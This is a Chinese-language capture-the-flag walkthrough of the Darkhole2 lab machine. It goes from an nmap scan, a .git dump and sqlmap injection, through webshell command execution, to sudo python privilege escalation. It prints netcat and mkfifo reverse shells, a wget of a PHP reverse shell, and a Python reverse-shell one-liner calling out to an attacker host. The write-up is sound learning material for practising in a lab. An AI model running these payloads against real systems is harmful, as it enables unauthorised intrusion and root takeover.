# Darkhole2

学到了学到了..第一步先用nmap扫

 ```
 nmap -sS -v -T4 -Pn -A -p 0-65535 172.192.168.235.135
 
 ```



扫出来开了22和80端口，80端口扫出来之后有个.git文件夹，这里注意用到的工具是git_extract(githack扫出来的东西并不是很行，)

![image-20211201214254932](https://gitee.com/yyssllz/pic/raw/master/image-20211201214254932.png)

用extract扫出来的是这个，如果是用githack则是

```php
<?php
session_start();
require 'config/config.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST['email']));
    $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST['password']));
    $check = $connect->query("select * from users where email='$email' and password='$pass' and id=1");
    if($check->num_rows){
        $_SESSION['userid'] = 1;
        header("location:dashboard.php");
        die();
    }
https://github.com/wangyihang/GitHacker.git
```

这里也可以使用githacker，githack只能恢复到最新版本，所以就看不到上面那一段了，登录进去之后有个sql注入，直接sqlmap就可以一把梭

![image-20211201214620480](https://gitee.com/yyssllz/pic/raw/master/image-20211201214620480.png)

得到用户名，登录上去之后查看历史记录发现：

```
jehad@darkhole:/$ cat ~/.bash_history
clear
ls
cd ..
sl
ls
cd losy
ls -la
cd .ssh/
ls
cat id_rsa
ls
id_rsa
cat id_rsa
ls -al
ls -la
cd ..
ls
ls -al
cd .ssh/
ls -la
cd .ssh/
ls 
cat id_rsa
ls
nano authorized_kyes 
ls
ls -la
rm authorized_kyes 
clear
cat authorized_keys 
ls -la
clear
automat-visualize3 
cat authorized_keys 
ls
cd ..
ls -la
clear
ls -la
cd .ssh/
cd .
cd ..
ls -la
ls -al
clear
ls- la
ls 
cd losy/
ls -la
cd .ssh/
ls
clear
ls -a
sl -al
c.
cd ..
ls -la
cd .ssh/
ls
ls -la
cd ..
cd .ssh/
ls
ls -la
ls
cat authorized_keys 
cat id_rsa
cat id_rsa.pub 
cat authorized_keys 
touch authorized_kyes
ls
rm authorized_kyes 
rm authorized_keys 
clear
ls
ls -la
cd ..
ls
ks
ls
cd .ssh/
ls
cat .ssh/id_rsa
cd .ssh/
ls
ls -la
cat id_rsa
ls -la
cd ..
cd .ssh/
ls
cat id_rsa
ls -la
cat id_rsa
ls
cd ..
cd .ssh/
ls -al
cat id_rsa
clear
cd /home/losy/
ls
ls -la
cd .ssh/
clear
ls -la
cat id_rsa
clear
netstat -tulpn | grep LISTEN
ssh -L 127.0.0.1:9999:192.168.135.129:9999 jehad@192.168.135.129
curl http://localhost:9999
curl "http://localhost:999/?cmd=id" 
curl "http://localhost:9999/?cmd=id" 
curl http://localhost:9999/
cd /opt
ls
cd web
ls -la
ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129
curl "http://localhost:9999/?cmd=id"
cat /etc/crontab 
exit
curl "http://localhost:9999/?cmd=wget http://google.com"
curl "http://localhost:9999/?cmd=wget&http://google.com"
curl "http://localhost:9999/?cmd=wget%20http://google.com"
curl "http://localhost:9999/?cmd=chmod%20+s%20/bin/bash"
ls -la /usr/bin/bash
curl "http://localhost:9999/?cmd=cat%20/etc/passwd"
curl "http://localhost:9999/?cmd=nc%20-e%20/bin/sh%20192.168.135.128%204242"
curl "http://localhost:9999/?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>&1|nc%20192.168.135.128%204242%20>/tmp/f"
clear
curl "http://127.0.0.1:9999/?cmd=ls -la"
curl "http://127.0.0.1:9999/?cmd=ls%20-la"
curl "http://127.0.0.1:9999/?cmd=cd%20~&ls"
curl "http://127.0.0.1:9999/?cmd=cd%20~&&ls"
curl "http://127.0.0.1:9999/?cmd=cd%20~||ls"
curl "http://127.0.0.1:9999/?cmd=cd%20/home/losy%20&&%20ls"
curl "http://127.0.0.1:9999/?cmd=python3"
curl "http://127.0.0.1:9999/?cmd=/usr/binpython3"
curl "http://127.0.0.1:9999/?cmd=/usr/bin/python3"
curl "http://127.0.0.1:9999/?cmd=whoami"
curl "http://127.0.0.1:9999/?cmd=wget%20192.168.135.128:8080/php-reverse-shell.php"
curl "http://127.0.0.1:9999/?cmd=ls"
curl "http://127.0.0.1:9999/?cmd=ls%20-la"
curl "http://127.0.0.1:9999/?cmd=wget%20192.168.135.128:8080/php-reverse-shell.php"
curl "http://127.0.0.1:9999/?cmd=wget%20http://192.168.135.128:8080/php-reverse-shell.php"
curl "http://127.0.0.1:9999/?cmd=ls%20-la"
ls
curl "http://127.0.0.1:9999/?cmd=ls%20-la"
clear
netstat -tulpn | grep LISTEN
curl "http://192.168.135.129/"
curl "http://127.0.0.1:9999/"
curl "http://127.0.0.1:9999/?cmd=id"
curl "http://127.0.0.1:9999/?cmd=nc"
curl "http://127.0.0.1:9999/?cmd=nc -e /bin/sh 192.168.135.128 4242"
curl "http://127.0.0.1:9999/?cmd=chmod u+s /bin/bash"
curl "http://127.0.0.1:9999/?cmd=chmod +s /bin/bash"

```

这里有个webshell发现很可疑(并且用户是losy，不是jehad)，curl 过去之后发现可以执行命令。本地测了一些用nc，bash什么的弹shell的感觉都不是很好使，用Python的反弹shell直接打过去了。

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```



之后get到了losy的用户权限，同样的查看history

![image-20211201214838547](https://gitee.com/yyssllz/pic/raw/master/image-20211201214838547.png)

拿到用户的密码，登录。然后尝试提权



sudo -l 发现有python的sudo权限，那么直接来就好了（当然历史里面也提到了）：

```python
sudo python3 -c "import pty;pty.spawn('/bin/bash')"
```

提权成功，这里我专门去查了一下sudo，原来sudo的东西用完以后就直接变成root了（确实蛮危险的）